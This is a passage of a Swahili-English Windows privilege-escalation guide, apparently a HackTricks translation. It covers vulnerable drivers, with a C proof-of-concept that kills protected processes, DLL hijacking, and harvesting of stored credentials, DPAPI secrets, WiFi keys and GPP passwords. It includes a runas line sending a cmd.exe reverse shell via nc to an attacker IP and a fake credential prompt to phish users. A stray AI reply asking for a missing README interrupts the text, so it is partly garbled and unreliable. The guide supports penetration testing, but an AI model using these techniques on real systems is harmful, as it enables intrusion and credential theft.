icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

**Angalia kama unaweza kuandika tena registry au binary itakayotekelezwa na mtumiaji mwingine.**\
**Soma ukurasa ufuatao ili ujifunze zaidi kuhusu maeneo ya kuvutia ya autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Dereva

Tafuta dereva za wadau wa tatu ambazo zinaweza kuwa **zisizo za kawaida au zilizo dhaifu**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), unaweza kupandisha mamlaka kwa kuiba a SYSTEM token moja kwa moja kutoka kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities zinakuruhusu kuandaa deterministic layouts, kutumia writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao kwa SDDL kali via IoCreateDeviceSecure lakini hukosa kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila bendera hii, secure DACL haitafuatwa wakati device inafunguliwa kupitia njia yenye sehemu ya ziada, ikimruhusu mtu yeyote asiye na ruhusa kupata a handle kwa kutumia namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtumiaji anapoweza kufungua device, privileged IOCTLs exposed by the driver zinaweza kutumiwa kwa LPE na tampering. Example capabilities observed in the wild:
- Kurudisha full-access handles kwa arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, ikiwemo Protected Process/Light (PP/PPL), kuruhusu AV/EDR kill kutoka user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mikakati ya kupunguza hatari kwa waendelezaji
- Daima weka FILE_DEVICE_SECURE_OPEN unapotengeneza device objects zinazokusudiwa kuzuiliwa na DACL.
- Thibitisha muktadha wa mwito kwa ajili ya operesheni zenye vibali maalum. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au kurudisha handle.
- Fanya ukomo kwa IOCTLs (access masks, METHOD_*, input validation) na fikiria modeli za brokered badala ya ruhusa za kernel za moja kwa moja.

Mawazo ya utambuzi kwa walinda
- Fuatilia user-mode opens za majina ya device yanayoshukiwa (e.g., \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria matumizi mabaya.
- Lazimisha Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumuishe orodha zako za kuruhusu/kukataa.


## PATH DLL Hijacking

Ikiwa una **write permissions inside a folder present on PATH** unaweza kuweza ku-hijack DLL inayopakiwa na process na **escalate privileges**.

Angalia ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Sehemu zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizowekwa hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miunganisho ya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezo
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

Zaidi [amri za upembuzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Faili la binari `bash.exe` pia linaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user, unaweza kusikiliza kwenye bandari yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, jaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Uthibitisho za Windows

### Uthibitisho za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa Credentials / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault huhifadhi sifa za watumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji kwa njia ya moja kwa moja**. Mwanzoni, inaweza kuonekana kuwa watumiaji wanaweza kuhifadhi sifa zao za Facebook, Twitter, Gmail n.k., ili kuingia kwa njia ya moja kwa moja kupitia vivinjari. Lakini si hivyo.

Windows Vault inahifadhi sifa ambazo Windows inaweza kutumia kuingia kwa watumiaji moja kwa moja, ambayo inamaanisha kwamba programu yoyote **ya Windows inayohitaji sifa ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault na kutumia sifa zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila wakati.

Isipokuwa programu hizo zinaingiliana na Credential Manager, sipofikiri ni rahisi kwao kutumia sifa za rasilimali fulani. Kwa hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na Credential Manager na kuomba sifa za rasilimali hiyo** kutoka kwa vault ya chaguo-msingi ya kuhifadhi.

Tumia `cmdkey` kuorodhesha sifa zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` kwa chaguo la `/savecred` ili kutumia saved credentials. Mfano ufuatao unaita remote binary kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` kwa seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwa [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

Vifunguo vya RSA vya mtumiaji vilivyosasishwa kwa kutumia DPAPI vinahifadhiwa katika saraka `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya mtumiaji. **Ufunguo wa DPAPI, ulioko pamoja na ufunguo mkuu unaolinda vifunguo binafsi vya mtumiaji katika faili hiyo hiyo**, kwa kawaida unajumuisha 64 bytes za data za nasibu. (Ni muhimu kutambua kwamba upatikanaji wa saraka hii una vizuizi, ukizuia kuorodhesha yaliyomo kwa kutumia amri `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` kwa hoja zinazofaa (`/pvk` au `/rpc`) ili ku-decrypt.

**credentials files protected by the master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` na `/masterkey` inayofaa ili decrypt.\
Unaweza **extract many DPAPI** **masterkeys** kutoka **memory** na `sekurlsa::dpapi` module (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vyeti vya PowerShell

**Vyeti vya PowerShell** mara nyingi hutumika kwa **scripting** na automation tasks kama njia ya kuhifadhi vyeti vilivyofichwa kwa urahisi. Vyeti vinalindwa kwa kutumia **DPAPI**, jambo ambalo kawaida linamaanisha yanaweza tu ku-decrypt na mtumiaji yule yule kwenye kompyuta ile ile walipozitengeneza.

Ili **decrypt** PS credentials kutoka kwenye faili inayoiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Zilizohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri zilizotekelezwa hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Cheti za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module na `/masterkey` inayofaa ili **decrypt any .rdg files**\  
Unaweza **extract many DPAPI masterkeys** kutoka memory kwa kutumia **Mimikatz** `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows ili **save passwords** na taarifa nyingine, bila kutambua kwamba ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na kila wakati inastahili kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kukimbia chini ya High Integrity level.**\  
**AppCmd.exe** iko katika directory ya `%systemroot%\system32\inetsrv\`.\  
Ikiwa faili hii ipo basi inawezekana kwamba baadhi ya **credentials** zimewekwa na zinaweza **recovered**.

Msimbo huu umetolewa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo.\
Wasakinishaji huendeshwa kwa **SYSTEM privileges**, nyingi zinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Rejista (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys` kwa hivyo unapaswa kuangalia kama kuna kitu cha kuvutia hapo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Iwapo utapata rekodi yoyote ndani ya njia hiyo, kuna uwezekano ni ufunguo wa SSH uliohifadhiwa. Ufunguo huo umehifadhiwa kwa usimbaji (encrypted) lakini unaweza kufichuliwa kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze moja kwa moja wakati wa kuanzisha mfumo, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon hakutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizo sawa (asymmetric).

### Faili zisizoangaliwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta mafaili haya kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Yaliyomo ya mfano:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vitambulisho vya Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili iitwayo **SiteList.xml**

### Nywila ya GPP iliyohifadhiwa

Kipengele kilikuwepo hapo awali kiliruhusu utekelezaji wa akaunti za msimamizi wa ndani zilizobuniwa kwenye kikundi cha mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zingeweza kupatikana na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyotangazwa hadharani, zingeweza kufumbuliwa na mtumiaji yeyote aliye thibitishwa. Hii ilikuwa hatari kwa sababu inaweza kumruhusu mtumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, ilitengenezwa function inayotafuta faili za GPP zilizohifadhiwa kwa ndani (locally cached) zinazoonyesha field ya "cpassword" ambayo si tupu. Itakapopata faili kama hiyo, function inafungua (decrypts) nywila na kurudisha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikisaidia katika utambuzi na urejeshaji wa udhaifu huu wa usalama.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Vijitambulisho vya OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Marekodi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza kila wakati **kuomba user aingize credentials zake au hata credentials za user mwingine** ikiwa unadhani anaweza kuyajua (kumbuka kwamba **kuomba** mteja moja kwa moja kuhusu **credentials** ni kweli **hatari**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zilizojulikana ambazo zamani zilikuwa na **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md. Please either:

- Paste the file content here (or multiple files) for translation, or
- Provide a link to the raw file(s) or the repository, or
- List the exact files you want searched/transformed.

Once you provide the content or access, I'll translate the relevant English text to Swahili following the guidelines you gave.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials katika RecycleBin

Unapaswa pia kukagua Bin kutafuta credentials ndani yake

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Registry keys nyingine zinazowezekana zenye credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za vivinjari

Unapaswa kuangalia dbs ambapo nywila za **Chrome or Firefox** zinahifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari kwa sababu labda baadhi ya **nywila** zimetunzwa huko.

Zana za kutoa nywila kutoka kwa vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu mawasiliano kati ya vipengee vya programu vilivyotengenezwa kwa lugha tofauti. Kila sehemu ya COM inatambulika kupitia class ID (CLSID) na kila sehemu inaonyesha utendaji kupitia interface moja au zaidi, zinazotambulika kwa interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry ndogo **InProcServer32** ambayo ina **default value** inayoonyesha kwenye **DLL** na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

